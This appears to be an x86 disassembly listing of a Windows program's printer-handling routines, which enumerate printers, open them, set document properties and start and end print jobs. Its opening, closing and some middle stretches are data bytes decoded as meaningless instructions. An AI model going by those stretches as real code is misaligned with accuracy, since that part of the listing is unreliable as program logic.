pop [ 0x0 ]
popad
outsb
jbe r-xdata
add eax [ bx + si ]
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
xchg esp eax
popad
inc ebp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al cl
pop ecx
inc ebp
add [ edx ] al
jb r-xdata
dec eax
popad
outsb
insb
verr [ gs : edx ]
inc ebp
add [ eax ] cl
inc ebx
push 0x69676e61
outsb
adc [ bx + si ] eax
inc esp
bound eax [ ebp ]
or dl [ ebp + 0x70 ]
popad
je r-xdata
call sub_456344
mov eax ebx
call sub_456244
mov eax [ ebx + 0x58 ]
mov edx [ eax + 0x20 ]
mov eax ebx
call sub_44dfac
pop ebx
retn
jae r-xdata
outsb
je r-xdata
add [ eax ] cl
inc ecx
push eax
jb r-xdata
inc esi
outsd
outsb
je r-xdata
insb
add al [ eax ]
add al [ eax ]
sub al [ eax ]
inc esp
bound eax [ ebp ]
or dl [ ebp + 0x70 ]
popad
je r-xdata
add [ ecx + 0x45 ] dl
add al 0x53
pop edi
inc ebp
add al bh
nop
inc esp
add [ eax + eax ] al
or [ eax + 0x72 ] dl
imul ebp [ esi + 0x74 ] 0x737265
add [ eax ] al
add [ edx ] al
add [ ebp + 0x56530040 ] cl
push edi
test dl dl
je r-xdata
outsd
outsb
je r-xdata
inc esi
jb r-xdata
add [ eax + eax - 0xc ] ah
call [ 0x6a004561 ]
add [ 0x45614100 ] ah
add [ edx ] ch
or al [ eax ]
add ch bl
pushad
inc ebp
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
add esp 0xfffffff0
call sub_405b0c
add [ edx + 0x45 ] ah
add [ ebx + eax * 2 ] cl
jb r-xdata
add [ eax + eax ] ch
add [ edx ] al
sub_4561c4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_44d060
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_456200
push ebx
mov ebx eax
mov dl 0x1
mov eax [ ebx + 0x58 ]
call sub_456344
mov eax ebx
call sub_456244
mov eax [ ebx + 0x58 ]
mov edx [ eax + 0x20 ]
mov eax ebx
call sub_44dfac
pop ebx
retn
sub_456244
push ebx
push esi
push edi
mov ebx eax
push 0x5a
mov eax [ ebx + 0x58 ]
mov eax [ eax + 0x20 ]
push eax
call GetDeviceCaps
mov esi [ ebx + 0x40 ]
cmp eax [ esi + 0x1c ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44c548
mov esi eax
push 0x5a
mov eax [ ebx + 0x58 ]
mov eax [ eax + 0x20 ]
push eax
call GetDeviceCaps
mov edi [ ebx + 0x40 ]
mov [ edi + 0x1c ] eax
mov edx esi
mov eax edi
call sub_44c564
sub_45628c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4055c0
mov [ esi + 0x14 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_4562c8
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
cmp [ esi + 0x1c ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_456344
mov eax esi
call sub_45718c
mov eax esi
call sub_4571d0
mov eax [ esi + 0x4 ]
call sub_4055f0
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax esi
call sub_45659c
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call ClosePrinter
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4055e0
test bl bl
jle r-xdata
push eax
call GlobalUnlock
mov eax [ esi + 0x2c ]
push eax
call GlobalFree
xor eax eax
mov [ esi + 0x2c ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_456344
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_456463
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ esi + 0x1f ]
cmp bl al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45646a
lea eax [ ebp - 0x8 ]
call j_sub_4068a0
retn
xor edi edi
mov edx ebx
sub dl 0x1
jb r-xdata
xor edx edx
mov eax esi
call sub_456474
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
je r-xdata
mov eax [ esi + 0x20 ]
push eax
call DeleteDC
xor eax eax
mov [ esi + 0x20 ] eax
jmp r-xdata
xor edx edx
call sub_44dfac
cmp al 0x2
je r-xdata
dec dl
je r-xdata
test edi edi
je r-xdata
mov edi CreateICW
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov [ esi + 0x1f ] bl
mov eax esi
call sub_456be8
push eax
mov eax esi
call sub_456d24
pop edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_407134
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_407134
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_407134
push eax
call edi
mov [ esi + 0x20 ] eax
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
xor edx edx
call sub_44dfac
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_40a204
mov eax [ ebp - 0x8 ]
call sub_455c80
mov edi CreateDCW
push eax
call DeleteDC
mov edx [ esi + 0x20 ]
call sub_44dfac
sub_456474
push ebp
mov ebp esp
push 0x0
push 0x0
xor ecx ecx
push ebp
push sub_4564d9
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp dl [ eax + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4564e0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
test dl dl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_40a204
mov eax [ ebp - 0x8 ]
call sub_455c80
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40a204
mov eax [ ebp - 0x4 ]
call sub_455c80
jmp r-xdata
sub_4564e4
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_456474
mov eax ebx
call sub_4568c4
call sub_44df24
push eax
call AbortDoc
mov [ ebx + 0x1d ] 0x1
mov eax ebx
call sub_45659c
mov [ ebx + 0x1d ] 0x1
pop ebx
retn
sub_456514
push ebx
add esp 0xffffffec
mov ebx eax
xor edx edx
mov eax ebx
call sub_456474
mov dl 0x2
mov eax ebx
call sub_456344
mov eax ebx
call sub_4568c4
mov edx [ eax ]
call [ edx + 0x78 ]
mov eax ebx
call sub_4568c4
call sub_456244
mov [ ebx + 0x1c ] 0x1
mov [ ebx + 0x1d ] 0x0
mov [ ebx + 0xc ] 0x1
mov eax esp
xor ecx ecx
mov edx 0x14
call sub_404c14
mov [ esp ] 0x14
mov eax [ ebx + 0x18 ]
call sub_407134
mov [ esp + 0x4 ] eax
push sub_455c98
mov eax [ ebx + 0x20 ]
push eax
call SetAbortProc
push esp
mov eax [ ebx + 0x20 ]
push eax
call StartDocW
mov eax [ ebx + 0x20 ]
push eax
call StartPage
add esp 0x14
pop ebx
retn
sub_45659c
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_456474
mov eax [ ebx + 0x20 ]
push eax
call EndPage
cmp [ ebx + 0x1d ] 0x0
jne r-xdata
mov [ ebx + 0x1c ] 0x0
mov [ ebx + 0x1d ] 0x0
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
push eax
call EndDoc
sub_4565d0
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_456474
mov eax [ ebx + 0x20 ]
push eax
call EndPage
mov eax [ ebx + 0x20 ]
push eax
call StartPage
inc [ ebx + 0xc ]
mov eax ebx
call sub_4568c4
mov edx [ eax ]
call [ edx + 0x78 ]
pop ebx
retn
sub_456600
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_456be8
push eax
mov eax ebx
call sub_456d24
pop edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
mov eax [ esi + 0x8 ]
call sub_407134
mov edx eax
mov eax edi
call sub_41259c
mov eax [ esi + 0x4 ]
call sub_407134
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41259c
mov eax [ esi + 0xc ]
call sub_407134
mov edx eax
mov eax [ ebp + 0xc ]
call sub_41259c
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x2c ]
mov [ eax ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_45666c
push ebx
push esi
mov esi edx
mov ebx eax
movzx eax [ r-xdata ]
mov [ ebx + 0x1e ] al
test esi 0x1
je r-xdata
test esi 0x100
je r-xdata
or [ ebx + 0x1e ] 0x2
test esi 0x8000
je r-xdata
or [ ebx + 0x1e ] 0x1
pop esi
pop ebx
retn
or [ ebx + 0x1e ] 0x4
sub_4566a8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4568b4
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_456474
mov eax [ ebx + 0x2c ]
cmp esi eax
je r-xdata
mov esi [ ebx + 0x2c ]
test esi esi
je r-xdata
test eax eax
je r-xdata
mov eax ebx
call sub_4571d0
mov eax [ ebx + 0x24 ]
test eax eax
je r-xdata
push esi
call GlobalLock
mov edi eax
mov [ ebx + 0x28 ] edi
mov edx [ edi + 0x48 ]
mov eax ebx
call sub_45666c
mov [ ebx + 0x2c ] esi
push eax
call GlobalUnlock
mov eax [ ebx + 0x2c ]
push eax
call GlobalFree
xor eax eax
mov [ ebx + 0x28 ] eax
xor edx edx
mov eax ebx
call sub_456344
mov [ ebp - 0xc ] 0xffffffff
mov eax ebx
call sub_456d24
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
push eax
call ClosePrinter
xor eax eax
mov [ ebx + 0x24 ] eax
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0xc ]
mov [ ebx + 0x14 ] eax
push 0x0
lea eax [ ebx + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call OpenPrinterW
test eax eax
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_455e74
push eax
lea eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_40a204
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] 0xa
mov edx [ ebp + 0xc ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] 0xa
lea edx [ ebp - 0x28 ]
mov ecx 0x1
call sub_4129f4
mov edx [ ebp - 0x14 ]
mov eax [ ebx + 0x10 ]
pop ecx
mov esi [ eax ]
call [ esi + 0x3c ]
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0xc
mov edx [ ebp + 0xc ]
call sub_407254
mov [ ebp - 0xc ] esi
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4568bb
lea eax [ ebp - 0x18 ]
mov edx 0x2
call j_sub_4068c4
retn
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_455ed4
test al al
je r-xdata
cmp [ ebx + 0x2c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x24 ]
push eax
push 0x0
call __imp_DocumentPropertiesW
push eax
push 0x42
call GlobalAlloc
mov esi eax
mov [ ebx + 0x2c ] esi
test esi esi
je r-xdata
mov eax [ ebx + 0x28 ]
mov edx [ eax + 0x48 ]
mov eax ebx
call sub_45666c
push esi
call GlobalLock
mov edi eax
mov [ ebx + 0x28 ] edi
push 0x2
push edi
push edi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x24 ]
push eax
push 0x0
call DocumentPropertiesW
test eax eax
jge r-xdata
mov eax [ ebx + 0x2c ]
push eax
call GlobalUnlock
mov eax [ ebx + 0x2c ]
push eax
call GlobalFree
xor eax eax
mov [ ebx + 0x2c ] eax
xor eax eax
mov [ ebx + 0x28 ] eax
sub_4568e4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_456931
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
add edx 0x1c
mov ecx 0x20
call sub_407290
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456938
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_456940
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ecx ecx
push ebp
push sub_4569a1
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_456344
mov dl 0x1
mov eax [ r-xdata ]
call sub_433bc4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
push sub_4568e4
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
call EnumFontsW
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4569a6
mov eax [ ebp - 0x4 ]
add eax 0x8
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
call sub_406120
call sub_406174
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4569e4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_456a3b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_456be8
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
movsx eax [ eax + 0x56 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456a42
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40a204
mov eax [ ebp - 0x4 ]
call sub_455c80
sub_456a48
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_456ab2
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_456474
mov eax ebx
call sub_456be8
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
xor edx edx
mov eax ebx
call sub_456344
mov eax [ ebx + 0x28 ]
mov [ eax + 0x56 ] si
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456ab9
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40a204
mov eax [ ebp - 0x4 ]
call sub_455c80
sub_456ac0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_456b1e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_456be8
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x4c ] 0x1
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40a204
mov eax [ ebp - 0x4 ]
call sub_455c80
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456b25
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_456b2c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_456ba1
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_456474
mov eax esi
call sub_456be8
cmp [ esi + 0x2c ] 0x0
jne r-xdata
xor edx edx
mov eax esi
call sub_456344
movzx eax bl
movzx eax [ eax * 4 + rw-data ]
mov edx [ esi + 0x28 ]
mov [ edx + 0x4c ] ax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456ba8
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40a204
mov eax [ ebp - 0x4 ]
call sub_455c80
sub_456c00
push ebp
mov ebp esp
add esp 0xfffff9f8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x608 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_456d16
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_456474
cmp esi 0xffffffff
jl r-xdata
lea edx [ ebp - 0x608 ]
mov eax [ rw-data ]
call sub_40a204
mov eax [ ebp - 0x608 ]
call sub_455c80
mov eax ebx
call sub_456d24
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jl r-xdata
mov eax ebx
call sub_456f6c
mov eax ebx
call sub_456be8
inc eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456d1d
lea eax [ ebp - 0x608 ]
call j_sub_4068a0
retn
cmp esi 0xffffffff
je r-xdata
cmp esi [ ebx + 0x14 ]
je r-xdata
mov eax ebx
call sub_456d24
mov edx [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea eax [ ebp - 0x604 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_4571e4
lea ecx [ ebp - 0x404 ]
lea edx [ ebp - 0x204 ]
call sub_456600
mov eax [ ebp - 0x4 ]
push eax
call GlobalUnlock
mov eax [ ebp - 0x4 ]
push eax
call GlobalFree
xor eax eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x604 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call sub_4571e4
lea ecx [ ebp - 0x404 ]
lea edx [ ebp - 0x204 ]
call sub_4566a8
mov eax ebx
call sub_4571d0
xor edx edx
mov eax ebx
call sub_456344
mov [ ebx + 0x14 ] esi
sub_456d24
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_456f53
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_433bc4
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
xor edx edx
push ebp
push sub_456f10
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov esi 0x2
mov [ ebp - 0xd ] 0x5
mov esi 0x6
mov [ ebp - 0xd ] 0x4
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_404204
mov [ ebp - 0x18 ] eax
xor edx edx
push ebp
push sub_456eff
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push edi
push 0x0
push esi
call EnumPrintersW
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
movzx edi [ ebp - 0xd ]
push edi
push 0x0
push esi
call EnumPrintersW
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
dec eax
test eax eax
jl r-xdata
call sub_4061a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456f5a
lea eax [ ebp - 0x2c ]
mov edx 0x3
call j_sub_4068c4
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_404220
retn
inc eax
mov [ ebp - 0x20 ] eax
mov esi [ ebp - 0x1c ]
mov eax [ esi + 0x4 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
call sub_455c40
mov ebx eax
jmp r-xdata
mov ebx [ ebp - 0x1c ]
mov esi [ ebx ]
push esi
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_455e74
push eax
lea eax [ ebp - 0x24 ]
mov edx esi
call sub_407254
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
pop ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
add [ ebp - 0x1c ] 0xc
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
dec [ ebp - 0x20 ]
jne r-xdata
mov eax [ esi ]
push eax
push ebx
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_455e74
push eax
lea eax [ ebp - 0x28 ]
push eax
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_40a204
mov eax [ ebp - 0x2c ]
mov edx [ esi ]
mov [ ebp - 0x3c ] edx
mov [ ebp - 0x38 ] 0xa
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] 0xa
lea edx [ ebp - 0x3c ]
mov ecx 0x1
call sub_4129f4
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
pop ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
lea eax [ ebp - 0x14 ]
call sub_455c40
mov ebx eax
add [ ebp - 0x1c ] 0x14
cmp [ ebp - 0xd ] 0x4
jne r-xdata
sub_456f6c
push ebp
mov ebp esp
add esp 0xfffff7d4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x82c ] edx
mov [ ebp - 0x824 ] edx
mov [ ebp - 0x820 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45717d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
push 0x5
push 0x0
push 0x1
call EnumPrintersW
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4041ec
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_457132
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
push 0x5
push 0x0
push 0x1
call EnumPrintersW
cmp [ ebp - 0x10 ] 0x0
jbe r-xdata
call GetLastError
cmp eax 0x7a
je r-xdata
mov [ ebp - 0x8 ] 0x400
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x81c ]
push eax
call GetDefaultPrinterW
test eax eax
jne r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
call GetLastError
cmp eax 0x7b
jne r-xdata
lea eax [ ebp - 0x81c ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
call sub_455c40
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x8 ]
add edx edx
lea eax [ ebp - 0x81c ]
xor ecx ecx
call sub_404c14
mov eax [ ebp - 0x4 ]
call sub_456d24
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
call sub_4184b8
lea edx [ ebp - 0x820 ]
mov eax [ rw-data ]
call sub_40a204
mov eax [ ebp - 0x820 ]
call sub_455c80
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
call sub_404220
retn
inc ebx
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec ebx
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_407134
push eax
push 0x0
mov eax [ ebx + 0x4 ]
call sub_407134
push eax
mov eax [ ebx + 0x8 ]
call sub_407134
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_4566a8
call sub_4061a4
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi [ eax + 0x8 ]
lea eax [ ebp - 0x824 ]
mov edx [ ebp - 0x18 ]
call sub_407254
mov edx [ ebp - 0x824 ]
mov [ ebp - 0x828 ] edi
mov eax [ ebp - 0x828 ]
call sub_411254
test eax eax
sete al
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457184
lea eax [ ebp - 0x82c ]
call j_sub_4068a0
lea eax [ ebp - 0x824 ]
mov edx 0x2
call j_sub_4068c4
retn
sub_45718c
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x10 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
lea eax [ esi + 0x10 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
inc eax
mov ebx eax
xor edi edi
mov edx edi
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_4055f0
inc edi
dec ebx
jne r-xdata
sub_457240
cwde
jb r-xdata
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x33ffba8d ] dh
jb r-xdata
mov ebp es
inc ebx
add ah cl
adc al [ ebx ]
add [ edx ] ch
jae r-xdata
int3
add [ esi ] bh
jae r-xdata
test dh al
inc ebx
add [ eax * 8 - 0x396bffbd ] ch
inc ebx
add al ch
leave
inc ebx
add [ eax ] bl
int 0x43
add [ esi + eax * 8 - 0x3963ffbd ] ah
inc ebx
add [ eax ] ah
int 0x43
add [ eax + 0x74 ] dl
inc ebp
add ah bh

add [ esi + 0x73 ] al
inc ebp
add [ eax + eax ] dl
add [ eax - 0x53ffbd33 ] dh
push esi
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
add al dh
int3
sub_4572ca
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
add al bh
adc [ eax ] al
xor al 0x0
add [ eax ] al
or [ esi + 0x49 ] eax
outsb
je r-xdata
push esp
imul ebp [ ebp + 0x65 ] 0x50003672
je r-xdata
jb r-xdata
or [ eax ] al
add [ eax ] eax
lodsb [ esi ]
jae r-xdata
add [ esi ] al
inc ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ ebx + esi * 2 + 0x45 ] ch
add al 0x53
popad
insb
